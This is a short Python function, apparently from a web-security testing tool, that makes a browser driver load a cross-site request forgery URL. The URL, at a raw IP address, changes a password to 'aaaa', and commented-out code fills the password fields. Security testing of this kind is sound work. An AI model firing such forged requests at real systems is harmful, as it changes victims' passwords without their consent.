""""
    Target URL: http://34.192.19.10/csrf_1.php?password_new=aaaa&password_conf=aaaa&action=change
    password_new
    password_conf
"""

def csrf_attack(driver, target_url):
    # print(driver, target_ur)
    driver.get(target_url)
    # if target_url == 'http://34.192.19.10/csrf_1.php?password_new=aaaa&password_conf=aaaa&action=change':
    #     password_new = driver.find_element_by_id("password_new").send_keys('bugbugbug')
    #     password_conf = driver.find_element_by_id("password_conf").send_keys('bugbugbug')

